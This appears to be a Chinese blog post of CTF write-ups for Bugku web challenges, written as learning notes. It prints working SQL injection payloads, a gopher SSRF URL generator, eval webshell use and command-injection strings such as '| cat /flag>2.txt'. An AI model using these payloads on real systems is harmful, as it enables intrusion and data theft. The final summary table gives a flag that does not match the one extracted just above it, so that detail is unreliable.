+++
date = '2026-01-03T23:49:27+08:00'
draft = true
title = 'Bugku'
+++
<style>
  .article-post img { 
      display: block !important; 
      margin: 2rem auto !important; 
      clear: both !important; 
  }
</style>
# 12.29-1.4号
做了20题左右，仅记录了几道略难的题目。
<br>  
![](img0.png)
<br>

## source


![](img1.png)

查看源码，发现一个类似flag的内容，尝试了一下不对，
用网页开发者工具查看cookie，也没有东西
尝试用目录扫描工具，dirsearch扫一下
<br> ,
![](img2.png)
<br> 
发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）   
那怎么把这个 .git 文件夹弄到本地来呢
这里我使用kali自带的wget命令，
wget -r https://你的服务器网站地址/.git

![](img3.png)
 
 发现一共有两次git提交
一次是d256328
一次是e0b8e8e
回滚到d256328，发现flag.txt被删除了，但实际上只要 .git 文件夹还在，任何人都可以通过 git log和 git show 找回被删除的敏感文件
使用ll命令查看后发现没有flag文件

![](img4.png)

输入git show d25632查看改动情况

![](img5.png)

发现这是一个假的flag
使用git reflog

![](img6.png)

发现还有很多历史版本，
然后使用git show xxxx挨个扫
发现果然flag藏在其中

![](img8.png)


## 本地管理员
查看源码：

![](img9.png)

发现一个编码，解码后是test123，不知道是密码还是账号
试一下

![](img10.png)

发现ip禁止访问，有提示是要本地管理员登录，所以尝试把ip改为127.0.0.1
用bp抓包重放，添加X-Forwarded-For:127.0.0.1字段

![](img11.png)

回显变了，说明ip是对的，要修改密码账号信息才可以，然后试了一下admin就成功了

![](img12.png)


## game1
猜测玩游戏得到一定分数就可以获得flag，抓包然后修改score为10000，不行。因为后面有个sign值，sign值的作用，进行签名，把数据做了加密后产生的，后台会把提交过去的数据做相同处理产生 sign 值和你发过去的 sign 值做判断，不一致则数据是被篡改了

![](img13.png)


查看源码，找一下sign值是如何生成的   发现是base64

![](img14.png)

![](img15.png)


把生成的加密结果放入bp发现还是不行
继续分析源码，发现有一个自定义的base.js，应该是自设的编码机制
然后直接在浏览器控制台调用函数，解码后的内容复制到bp的sign

![](img16.png)
![](img17.png)

成功拿到flag 
flag{42febc48bc0404dc97ad61dab97d7d6d}


# 1.5-1.9
## bp
是一个登录界面，随便提交一个密码

![](img18.png)

然后跳转到check.php页面，查看源码

![](img19.png)

发现要到success.php页面然后参数code正确才可以
然后code不等于bugku10000时才可以，应该是密码正确了，经过check.php验证，会自动生成正确的code
所以直接拿字典爆破，

![](img20.png)

发现长度全都一样

![](img21.png)

可以让 burp 筛选下字符里不包含 bugku10000 

![](img22.png)


![](img23.png)

成功获取flag

![](img24.png)

## eval
查看源码：

![](img25.png)

需要通过hello参数传递内容，输入?hello=$GLOBALS，看一下全局变量


![](img26.png)

看到了flag变量，但值没有

eval函数会执行字符串中的php代码,试一下

![](img27.png)

可以把传入的hello参数设置为一句话木马
然后用蚁剑连接

![](img28.png)

连接成功后就可以看到flag.php文件，看到flag了
，忘记截图了。。


## 需要管理员

打开题目发现是404界面，源码也没有有用的信息
扫描一下发现有个robots.txt
robots.txt 文件作用是
避免爬虫抓取不必要的内容（如重复页面、后台页面），节省服务器带宽和资源。  
引导搜索引擎更高效地抓取网站的重要内容，有助于优化 SEO（搜索引擎优化排名）

![](img29.png)

查看后发现两行内容，第一行是解释对哪些类别的爬虫生效
第二行是指定禁止爬虫抓取的路径。

![](img30.png)

我们查看一下resul1.php页面

![](img31.png)

说要管理员身份
结合他给的x参数

![](img32.png)

## 速度要快

查看源码，说是要post传递一个margin的参数


![](img33.png)

然后继续找，看请求头，发现了疑似flag的值
结尾是双等号  一看就是base64编码

![](img34.png)


解码后得到：      跑的还不错，给你flag吧: MTY4NTcz

试了提交flag不对，结合刚开始发现的margin参数，应该是margin参数要等于MTY4NTcz
因为要先请求获得flag字段，然后解码，在传递flag参数，这个题肯定要用脚本来做，
然后试了一下发现还是不行

后面觉得base64解码后的字符串没有什么用，不像是margin的值，然后尝试再次解码，发现解码后是一个数字了，这次估计就对了

```
import requests  
import base64  
import re  
  
url = "http://171.80.2.169:11642/" 
def solve():  
    session = requests.Session()  
  
    try:  
        # 1. 获取响应头  
        response = session.get(url)  
        flag_encoded = response.headers.get('flag')  
  
        if not flag_encoded:  
            print("错误：响应头中未找到 'flag'")  
            return  
  
        print(f"获取到的原始 Flag (Base64): {flag_encoded}")  
  
        # 2. 第一层解码并转为 UTF-8 字符串  
        # 结果类似于: "跑得还不错，给你flag： NDc4MTQ1"        
        first_decode_bytes = base64.b64decode(flag_encoded)  
        first_decode_text = first_decode_bytes.decode('utf-8')  
        print(f"第一层解码结果: {first_decode_text}")  
  
        # 3. 提取真正的第二次 Base64 字符串  
        # 使用正则表达式匹配冒号后面的 Base64 字符，或者直接通过分割字符串  
        # 这里处理中文冒号 '：' 和英文冒号 ':'       
         if "：" in first_decode_text:  
            second_b64_part = first_decode_text.split("：")[-1].strip()  
        elif ":" in first_decode_text:  
            second_b64_part = first_decode_text.split(":")[-1].strip()  
        else:  
            # 如果没有冒号，尝试取最后一段空格后的内容  
            second_b64_part = first_decode_text.split()[-1].strip()  
  
        print(f"提取出的待解码部分: {second_b64_part}")  
  
        # 4. 第二层解码  
        final_flag = base64.b64decode(second_b64_part).decode('utf-8')  
        print(f"最终结果 (margin): {final_flag}")  
  
        # 5. POST 提交  
        data = {'margin': final_flag}  
        post_response = session.post(url, data=data)  
  
        print("--- 响应结果 ---")  
        print(post_response.text)  
  
    except Exception as e:  
        print(f"运行过程中出现错误: {e}")  
  
  
if __name__ == "__main__":  
    solve()
```

运行后就得到了flag

![](img35.png)

## file_get_contents

打开题目 

```<?php  
extract($_GET);  
if (!empty($ac))  
{  
$f = trim(file_get_contents($fn));  
if ($ac === $f)  
{  
echo "<p>This is flag:" ." $flag</p>";  
}  
else  
{  
echo "<p>sorry!</p>";  
}  
}  
?>

```

extract();  这个函数会将 URL 参数（GET 请求）转化为变量名和变量值
变量f是从fn文件中读取的内容，如果ac等于f，就输出flag
下面关键就是区找flag文件了，用dirsearch扫发现了flag.txt

![](img36.png)
打开flag.txt文件，只有bugku字段，fn就是flag.txt，ac就是bugku。

![](img37.png)


## 1.10-
### 成绩查询
是个sql注入
发现是post类型的请求，然后发到burp，保存项目


![](img38.png)



保存到sqlmap目录下，命名为1.txt

![](img40.png)



 pyhton sqlmap.py -r 1.txt --dbs
 
![](img43.png)

获取数据库后再爆表：
pyhton sqlmap.py -r 1.txt -D skctf  --tables

![](img42.png)

得到表再爆破数据
pyhton sqlmap.py -r 1.txt -D skctf  -T fl4g --dump

![](img41.png)

### no selection


发现是一个get请求

![](img44.png)

直接用sqlmap爆破
得到了flag数据库想继续爆破表

![](img46.png)

但是报错，无法的接收到表名

手动注入尝试一下，拼接select database();  回显是no hacker！  应该是添加了过滤机制，过滤了一些常用函数，拼接SHOW DATABASE();--  读取到了所有的数据库，发现有flag，

![](img47.png)
再查flag数据库中的表

```
任意字符';USE flag;SHOW TABLES;-- # USE 使用数据库，SHOW TABLES 查看所有表
```
发现还有个flag表
刚才用select函数不行，这里采用的是handler 函数 ，
1. HANDLER 表名 OPEN； （大小写 SQL 里的关键字都可以，意思是打开指定表名）
2. HANDLER 表名 READ NEXT; （读取表中下一行-第一次读取的是第一行）


```
任意字符';HANDLER flag OPEN; HANDLER flag READ NEXT;
```
有回显，果然可以用。继续读下一行就需要多加一行命令HANDLER flag READ NEXT;

```
任意字符';HANDLER flag OPEN; HANDLER flag READ NEXT;HANDLER flag READ NEXT;
```
以此类推
```
任意字符';HANDLER flag OPEN; HANDLER flag READ NEXT;HANDLER flag READ NEXT;HANDLER flag READ NEXT;
```
大概读了七次

![](img48.png)

#### 小结：
除了要掌握sqlmap的爆破注入外，还要注重基础的手工注入


| **特性**    | **SELECT**                      | **HANDLER**                       |
| --------- | ------------------------------- | --------------------------------- |
| **标准性**   | SQL 标准，支持所有主流数据库。               | **MySQL/MariaDB 特有**，非标准 SQL。     |
| **执行过程**  | 经过解析、优化，性能较高但流程复杂。              | **直接访问**存储引擎，绕过优化器。               |
| **隐蔽性**   | **低**。极易被 WAF 识别和拦截。            | **高**。作为冷门语法，常被防火墙规则忽略。           |
| **功能丰富度** | **强**。支持 Join、Group By、聚合函数等。   | **弱**。只能一行行读，不支持复杂的逻辑运算。          |
| **语法结构**  | `SELECT ... FROM ... WHERE ...` | `HANDLER ... OPEN / READ / CLOSE` |
### LOGIN2

进入题目界面是一个登录页面，打开开发者工具，发现一串编码，解码一下

![](img49.png)


```
$sql="SELECT username,password FROM admin WHERE username='".$username."'";//从admin表中查询用户名密码
if (!empty($row) && $row['password']===md5($password)){
}   验证登录的密码和md5加密的
```   
- 如果查到了用户，并且数据库中的 `password` 字段 **等于** 用户输入密码的 `md5` 值，则认证通过。
- 注意：这里 **没有对密码做预处理**，直接 `md5($password)`，所以能控制查询结果，就可以绕过。
我们在用户名输入  ' UNION SELECT 'admin','e10adc3949ba59abbe56e057f20f883e' --
就会执行
SELECT username,password FROM admin WHERE username=' '
UNION SELECT 'admin','e10adc3949ba59abbe56e057f20f883e' -- ';
然后密码输入123456   e10adc3949ba59abbe56e057f20f883e(123456md5加密结果)

![](img50.png)


输入Is,可以查看进程
但是没有回显对应的进程内容，  用 sh shell 执行 ps -aux | grep 输入框传入的命令

![](img51.png)
输入ls / > 1.txt    这个命令是将**系统根目录（/）** 的所有文件和目录列表写入到当前目录下的 `1.txt` 文件中
但是执行这个命令后，在地址栏输入1.txt可以访问，但是内容是空
这是由于实际命令被拼接到了ps -aux | grep ls / > 1.txt   就会导致报错

![](img52.png)

如果要让Is命令作为单独的命令使用可以采用管道分隔符
   `任意字符 | ls / > 1.txt`
   这样就可以看到目录列表
   
   ![](img53.png)

看到了flag文件
继续输入=`xxx| cat /flag>2.txt`
然后访问2.txt就可以看到flag了

![](img54.png)
#### 总结
sql联合注入加webshell写入文件读取
当网页没有命令返回内容，试试用写入文件的方式绕过，我们发现了服务器上的根目录有个 flag 文件（注意不是 Web 网页服务的根目录，所以你访问 网址/flag 是没有任何内容的）


### very-easy-sql
进入后是一个登录界面，然后查看源码发现有一个use.php
![](img57.png)

![](img58.png)
访问一下  curl命令是用来对服务器发起请求的，我们还要用本地内部账户进行请求，
可以确定攻击方向，利用 use.php 页面中的 curl 命令进行 SSRF 攻击，攻击的目标就是靶场首页的登录框。

再补充学习一些gopher协议
      **Gopher** 是一个在万维网（WWW）流行之前的**分布式文档搜索和检索协议**，它能**将任意 TCP 流量封装在 URL 中**，可构造任意协议请求（如 MySQL、Redis、HTTP 等）
      标准格式：`gopher://<host>:<port>/_<payload>`
      ![](img60.png)
   
   工作流程
   1. 客户端请求 `gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1...`
 2. 服务器解析 URL，提取 `_` 后的内容
 3. 建立到 `127.0.0.1:80` 的 TCP 连接
 4. **将解码后的 payload 原样发送**给目标服务
 5. 将目标服务的响应返回给客户端
![](img59.png)

原请求包如下
```
GET / HTTP/1.1
  Host: 61.147.171.105:61845
   User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: this_is_your_cookie=inner_user
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

而我们用gopher协议伪造的请求包只需要包含以下内容
```
 POST / HTTP/1.1
 Host: 61.147.171.105:65176
 Content-Length: 20
 Content-Type: application/x-www-form-urlencoded
 uname=123&passwd=123
```

```
import urllib.parse  
  
host = "127.0.0.1:80"  
payload = "uname=123&passwd=123"  # 请求包中的 payload  
template = """\  
POST / HTTP/1.1  
Host: {}  
Content-Length: {}  
Content-Type: application/x-www-form-urlencoded  
  
{}  
""".format(host, len(payload), payload)  
  
  
def gopher_data(string):  
    """  
    :param string: 待转换的请求包  
    :return:  
    """    encode_result = urllib.parse.quote(string)  # 进行 url 编码  
    # 回车 \n -> url 编码后 -> %0A -> 将 %0A 替换为 %0D%0A; 数据包模板末尾有一个换行，就不用额外添加 %0D%0A 了  
    return "gopher://{}/_{}".format(host, encode_result.replace("%0A", "%0D%0A"))  
  
print(gopher_data(template))
```
运行代码得到了
```
gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Length%3A%2020%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Auname%3D123%26passwd%3D123%0D%0A
```

然后复制到url提交

![](img56.png)
把uname和passwd换为admin弱密码进行尝试
```
 gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Length%3A%2024%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Auname%3Dadmin%26passwd%3Dadmin%0D%0A
```
这里就有了set-cookie:

![](img61.png)
解码后得到了是admin


![](img62.png)

 利用脚本
```
import base64  
import urllib.parse  
  
TARGET_IP = "127.0.0.1"  
TARGET_PORT = 80  
  
HTTP_TEMPLATE = """POST / HTTP/1.1  
Host: {ip}  
Content-Length: 0  
Content-Type: application/x-www-form-urlencoded  
Cookie: this_is_your_cookie={payload}  
Connection: close  
  
"""  
def generate_gopher_url(sql_payload):  
    # Base64 编码 SQL payload    b64_payload = base64.b64encode(sql_payload.encode()).decode()  
  
    # 填充 HTTP 模板（注意：Host 不包含端口）  
    http_request = HTTP_TEMPLATE.format(  
        ip=TARGET_IP,  
        payload=b64_payload  
    )  
  
    # 转换为 Gopher 格式  
    encoded = urllib.parse.quote(http_request)  
    encoded = encoded.replace('%0A', '%0D%0A')  # 修复换行符  
  
    return f"gopher://{TARGET_IP}:{TARGET_PORT}/_{encoded}"  
  
  
if __name__ == "__main__":  
    payload = "admin'"  
    gopher_url = generate_gopher_url(payload)  
  
    print("=" * 60)  
    print("✅ 生成的 Gopher URL（直接复制到 use.php 表单中）:")  
    print("=" * 60)  
    print(gopher_url)  
    print("\n" + "=" * 60)
```
先测试一些playload：admin'

发现有报错回显：

![](img63.png)

可以用报错注入：

```payload：admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #```

得到了四个表：

![](img64.png)

```
payload:"""admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="flag"),0x7e),1) #"""
```

得到了flag表中只有一列flag

![](img65.png)
```
payload：admin') and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1) #
```
由于upadatexml()对返回的字符限制为32个
所以得到了前半部分flag~cyberpeace{459c4b9188f4ad1cef05

![](img66.png)
```
"admin') and updatexml(1,concat(0x7e,(select mid(group_concat(flag),20,50) from flag),0x7e),1) #"
```
得到了后半部分flag：   ~88f4ad1cef05a0f1282306a1}~

![](img67.png)
flag：cyberpeace{459c4b9188f4ad1cef05a0f1282306a1}
#### 总结：
这道题目是ssrf和gopher协议以及sql报错注入的综合题目
	通过use.php页面，以及内网只能对内访问，gopher可以构造任意tcp流量，mysql中的updatexml()函数，触发xpath错误，
	

完整攻击流程

| 步骤  | 操作                  | 目的                                             |
| --- | ------------------- | ---------------------------------------------- |
| 1   | 访问 `/use.php`       | 发现 SSRF 入口点                                    |
| 2   | 构造基础 Gopher URL     | 访问内网登录页面                                       |
| 3   | 使用弱口令 `admin/admin` | 获取有效 Cookie 值                                  |
| 4   | 识别 SQL 注入点          | 分析 Cookie 中的漏洞                                 |
| 5   | 探测数据库结构             | 获取表名/列名信息                                      |
| 6   | 分段提取 flag           | 绕过 32 字符限制                                     |
| 7   | 拼接完整 flag           | `cyberpeace{a0e9c720fecbd276d9f611e262249a87}` |
